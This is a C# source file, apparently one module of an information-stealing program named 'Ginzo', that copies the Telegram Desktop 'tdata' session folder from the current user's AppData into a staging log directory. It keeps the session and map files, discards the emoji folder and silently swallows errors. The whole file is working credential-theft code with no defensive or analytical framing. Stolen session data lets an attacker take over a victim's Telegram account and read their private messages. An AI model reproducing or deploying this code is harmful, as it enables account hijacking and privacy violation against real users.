using System;
using System.IO;

namespace Ginzo
{
    public class Telegram
    {
        private static bool in_patch = false;
        public static void Start()
        {
            try
            {
                var dir_from = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Telegram Desktop\\tdata";
                if (!Directory.Exists(dir_from))
                {
                    return;
                }
                var dir_to = Preparing.LogPath + "\\Telegram";
                CopyAll(dir_from, dir_to);
                Directory.Delete(Preparing.LogPath + "\\Telegram\\emoji", true);
                Console.WriteLine("Telegram session saved on log path");
            }
            catch { Console.WriteLine("Telegram session not found"); }
        }
        private static void CopyAll(string fromDir, string toDir)
        {
            try
            {
                DirectoryInfo di = Directory.CreateDirectory(toDir);
                di.Attributes = FileAttributes.Directory;
                foreach (string s1 in Directory.GetFiles(fromDir))
                    CopyFile(s1, toDir);
                foreach (string s in Directory.GetDirectories(fromDir))
                    CopyDir(s, toDir);
            }
            catch { }
        }
        private static void CopyFile(string s1, string toDir)
        {
            try
            {
                var fname = Path.GetFileName(s1);
                if (in_patch && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                    return;
                var s2 = toDir + "\\" + fname;
                File.Copy(s1, s2);
            }
            catch { }
        }

        private static void CopyDir(string s, string toDir)
        {
            try
            {
                in_patch = true;
                CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                in_patch = false;
            }
            catch { }
        }
    }

}